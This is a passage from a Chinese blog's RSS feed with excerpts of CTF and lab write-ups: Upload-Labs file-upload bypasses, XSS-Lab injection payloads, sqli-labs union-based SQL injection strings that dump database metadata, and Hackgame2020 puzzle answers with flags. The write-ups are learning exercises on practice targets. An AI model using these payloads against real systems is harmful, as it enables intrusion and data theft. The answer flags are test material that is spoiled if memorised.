&amp;#34;上传出错！&amp;#34;; } }else if(($fileext == &amp;#34;png&amp;#34;) &amp;amp;&amp;amp; ($filetype==&amp;#34;image/png&amp;#34;)){ .</description>
    </item>
    <item>
      <title>Upload-Labs(三)</title>
      <link>/posts/ctf/upload-labs3/</link>
      <pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate>
      <guid>/posts/ctf/upload-labs3/</guid>
      <description>前言 ​&#x9;继续接着上一次的Upload-labs往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。&#xA;​&#x9;在线靶机地址：&#xA;linux环境 windows环境 Pass-11 ​&#x9;(这题使用了windows环境)&#xA;​&#x9;源码：&#xA;$is_upload = false; $msg = null; if(isset($_POST[&amp;#39;submit&amp;#39;])){ $ext_arr = array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;); $file_ext = substr($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;],strrpos($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;],&amp;#34;.&amp;#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]; $img_path = $_GET[&amp;#39;save_path&amp;#39;].&amp;#34;/&amp;#34;.rand(10, 99).date(&amp;#34;YmdHis&amp;#34;).&amp;#34;.&amp;#34;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &amp;#39;上传出错！&amp;#39;; } } else{ $msg = &amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;; } } ​&#x9;分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了$_GET[&#39;save_path&#39;]，本题提示也写道&#xA;本pass上传路径可控！，就是通过这个GET变量控制上传路径。&#xA;​&#x9;这一关的突破方法需要有一些条件：php版本需要低于5.3.29（我使用的是php版本5.3.17的本地靶机），另一个条件是magic_quotes_gpc需要为关闭状态。magic_quotes_gpc的作用官方文档写道：&#xA;Warning 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。&#xA;​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &amp;rsquo; (单引号)、&amp;quot; (双引号)、\（反斜杠）和 NUL&amp;rsquo;s 被一个反斜杠自动转义。</description>
    </item>
    <item>
      <title>Upload-Labs(二)</title>
      <link>/posts/ctf/upload-labs2/</link>
      <pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate>
      <guid>/posts/ctf/upload-labs2/</guid>
      <description>前言 ​&#x9;这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。&#xA;$is_upload = false;&#xD;$msg = null;&#xD;if (isset($_POST[&amp;#39;submit&amp;#39;])) {&#xD;if (file_exists(UPLOAD_PATH)) {&#xD;//这里下面是过滤&#xD;$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);&#xD;$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);&#xD;$file_name = deldot($file_name);//删除文件名末尾的点&#xD;$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);&#xD;$file_ext = strtolower($file_ext); //转换为小写&#xD;$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA&#xD;$file_ext = trim($file_ext); //首尾去空&#xD;//这里下面是移动文件。&#xD;if (!in_array($file_ext, $deny_ext)) {&#xD;$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];&#xD;$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;&#xD;if (move_uploaded_file($temp_file, $img_path)) {&#xD;$is_upload = true;&#xD;} else {&#xD;$msg = &amp;#39;上传出错！&amp;#39;;&#xD;}&#xD;} else {&#xD;$msg = &amp;#39;此文件类型不允许上传！&amp;#39;;&#xD;}&#xD;} else {&#xD;$msg = UPLOAD_PATH .</description>
    </item>
    <item>
      <title>Upload-Labs(一)</title>
      <link>/posts/ctf/upload-labs1/</link>
      <pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate>
      <guid>/posts/ctf/upload-labs1/</guid>
      <description>介绍 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。&#xA;在线靶机地址：&#xA;linux环境 windows环境 Pass-01 ​&#x9;尝试上传php木马，发现提示上传错误&#xA;​&#x9;提示只能上传jpg、png、gif类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。&#xA;​&#x9;源码：&#xA;function checkFile() { var file = document.getElementsByName(&amp;#39;upload_file&amp;#39;)[0].value; if (file == null || file == &amp;#34;&amp;#34;) { alert(&amp;#34;请选择要上传的文件!&amp;#34;); return false; } //定义允许上传的文件类型 var allow_ext = &amp;#34;.jpg|.png|.gif&amp;#34;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&amp;#34;.&amp;#34;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &amp;#34;|&amp;#34;) == -1) { var errMsg = &amp;#34;该文件不允许上传，请上传&amp;#34; + allow_ext + &amp;#34;类型的文件,当前文件类型为：&amp;#34; + ext_name; alert(errMsg); return false; } } ​&#x9;把文件后缀名改成jpg格式上传，使用burp suit抓包。把.jpg后缀重新改为.php即可实现绕过前端JS代码。&#xA;​&#x9;然后右键打开图片，代码成功执行。完工</description>
    </item>
    <item>
      <title>Hackgame2020(二)</title>
      <link>/posts/ctf/hackgame20202/</link>
      <pubDate>Thu, 05 Nov 2020 09:29:22 +0000</pubDate>
      <guid>/posts/ctf/hackgame20202/</guid>
      <description>一闪而过的Flag ​&#x9;根据题目信息程序每次运行时隐约可见黑色控制台上有 flag 一闪而过，我想到了应该能看程序的代码啥的找到，但是天下武功，唯快不破，下载 运行 截图一气呵成。&#xA;​&#x9;​&#x9;接下来让我康康哪一位是瞎子，包括答案里也是满满的嘲讽。&#xA;参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}&#xA;从零开始的记账工具人 ​&#x9;npy给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。&#xA;​&#x9;原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：&#xA;import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sn = new Scanner(System.in); String str; int x; int cnt=0; double result=0; while(cnt++!=1000){ str = sn.next(); x = sn.nextInt(); result += tonum(str)*x; } System.out.println(result); } public static double tonum(String s){ int len; double res=0,temp = 1; double result=0; len = s.length(); for(int i=0;i&amp;lt;len;i++){ switch (s.</description>
    </item>
    <item>
      <title>XSS-Lab (一)</title>
      <link>/posts/ctf/xss-lab1/</link>
      <pubDate>Tue, 03 Nov 2020 10:13:39 +0000</pubDate>
      <guid>/posts/ctf/xss-lab1/</guid>
      <description>头 靶机地址：https://buuoj.cn/challenges#XSS-Lab&#xA;level 1 ​&#x9;​&#x9;观察发现欢迎用户test与URL中的name=test字段对应，尝试修改发现可行。直接将name字段改为name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;，完工。&#xA;level 2 ​&#x9;在搜索栏中的输入会回显到页面，查看网页源代码，发现值在input的value属性中&#xA;​&#x9;构造闭合&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // ，构造以后的标签会变成.... value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &amp;quot;&amp;gt;。完工&#xA;level 3 ​&#x9;老样子构造value属性闭合，尝试&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // 构造闭合，查看网页源代码发现语句变成&amp;amp;quot;&amp;amp;gt; &amp;amp;lt;script&amp;amp;gt;alert()&amp;amp;lt;/script&amp;amp;gt; // ，说明把&amp;quot;、&amp;lt;、&amp;gt;、进行了html编码过滤，尝试构造onmouseover事件(鼠标移到事件)，构造语句&#39;onmouseover=&#39;alert()&#39;。完工&#xA;level 4 ​&#x9;构造闭合&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // ，查看源代码发现进行了&amp;gt;、&amp;lt;过滤，尝试构造事件&amp;quot; onmouseover=&#39;alert()&#39;。完工&#xA;​&#x9;说明一下标签的事件有很多类型，可以自己试试别的事件响应。&#xA;level 5 ​&#x9;检查一下都有什么过滤。发现有一下过滤&#xA;script &amp;ndash;&amp;gt; scr_ipt&#xA;onmouseover &amp;ndash;&amp;gt; o_nmouseover&#xA;无法采用事件，那么尝试构造一个标签 &amp;quot;&amp;gt; &amp;lt;a href=&#39;javascript:alert()&#39;&amp;gt;233&amp;lt;/a&amp;gt; //，发现javascript没有过滤，说明判断语句匹配值仅仅为script，点击构造的&amp;lt;a&amp;gt;标签内容。完工&#xA;​</description>
    </item>
    <item>
      <title>Hackgame2020(一)</title>
      <link>/posts/ctf/hackgame20201/</link>
      <pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate>
      <guid>/posts/ctf/hackgame20201/</guid>
      <description>前言 比赛地址：https://hack.lug.ustc.edu.cn/&#xA;web 签到题 ​&#x9;第一题是flag提取器，打开题目以后页面是一个提取器下面一个进度条和一个提取按钮。&#xA;​&#x9;随便拉了拉进度条发现初始是0末尾是1.5，然后中间的数值都是小数&#xA;​&#x9;我猜的题目可能是想让数值为1时能提取到flag。&#xA;​&#x9;F12查看源代码，定位到进度条的标签，查看属性&#xA;​&#x9;确实和猜测一样最大最小值分别是0、1.5，注意到step值为0.00001，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到1个flag，就把网页上的step值改为1。然后随便拖动一下进度条得到1，点击提取按钮，完工。&#xA;2048 ​&#x9;打开题目是一个2048的小游戏，第一个想法就是玩2048达到一定分数以后会获得flag（可恶这个比赛怎么知道最近我天天在玩2048的）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种逃课废物是不可能努力哒！&#xA;F12开始翻网页资源&#xA;​&#x9;还好上次摸鱼课题做了一个网页版的2048，略微能看懂一点点结构，第一个animframe_polyfill应该就是管动画效果的，keynpard...这个肯定是相应按键的，local_storage_manager应该是保存游戏的，game_manager感觉就是管理整个游戏的主要文件。&#xA;​&#x9;打开game_manager粗略的看了下变量，score 分数、over、won、keepPlaying游戏状态，想赢游戏肯定是和score、won有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&#xA;发现了&#xA;​&#x9;只有这里修改了won的状态，前面还有个16384这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（小声bb截图为证），直接让if里面的语句为真就可以获胜，直接修改if(1) self.won = true，保存文件，按一个方向键让语句执行到，完工。&#xA;general 猫咪问题++ ​&#x9;秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&#xA;​&#x9;题意思很明显的书考验同学的搜题技巧。那就开工。&#xA;第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&#xA;提示：学术上一般认为龙不属于哺乳动物。&#xA;​&#x9;本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。&#xA;​&#x9;一个比较有印象就是FreeDOS这个标志就离谱，什么玩意&#xA;参考答案 ：12&#xA;第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​&#x9;卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。&#xA;参考答案：256&#xA;第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？</description>
    </item>
    <item>
      <title>sql-labs(一)</title>
      <link>/posts/ctf/sql-labs1/</link>
      <pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate>
      <guid>/posts/ctf/sql-labs1/</guid>
      <description>前言 在线靶机地址：https://buuoj.cn/challenges#sqli-labs&#xA;less-1 ​&#x9;首先说明sql注入的大致步骤：&#xA;判断注入类型。如整型字符型注入等。 判断列数 判断数据的回显位 构造sql语句 ​&#x9;根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句?id=1&#39;，发现数据库报错&#xA;​&#x9;通过后面的报错语句1&#39;&#39; LIMIT 0,1的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询union插入我们想要查询的语句。&#xA;​&#x9;推出数据库的查询的部分语句可能为where id = &#39;$id&#39;LIMIT 0,1，那么通过构造闭合?id=1&#39; [这里添加语句] --+添加自己想要语句，语句后面的--+作用是将后面的其他语句注释掉。&#xA;​&#x9;首先是判断字段个数：?id=1&#39; order by 1 --+，页面显示正常，直到尝试?id=1&#39; order by 4 --+发现数据库报错&#xA;​&#x9;说明数据库的字段值只有四个。&#xA;​&#x9;接下来测试数据的回显位，构造语句?id=&#39; union select 1,2,3 --+，这里需要注意的有，前面id的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面union构造的语句就不会显示；union连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。&#xA;​&#x9;执行后页面显示。&#xA;​&#x9;说明查询语句的2,3是回显位，之后就可以将查询的语句进行替换。如：&#xA;​&#x9;获取数据库版本，数据库路径，当前用户，当前数据库： ​&#x9;?id=&#39; union select 1,concat_ws(&#39;_&#39;,user(),version(),database()),@@basedir --+&#xA;页面显示&#xA;​&#x9;利用元数据库来爆表、爆数据&#xA;​&#x9;?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&#xA;​&#x9;之后大家可以自行发挥。&#xA;​&#x9;flag的话我做的题是在ctftraining.flag表中，答案在：?id=&#39; union select 1,flag,3 from ctftraining.</description>
    </item>
  </channel>
</rss>
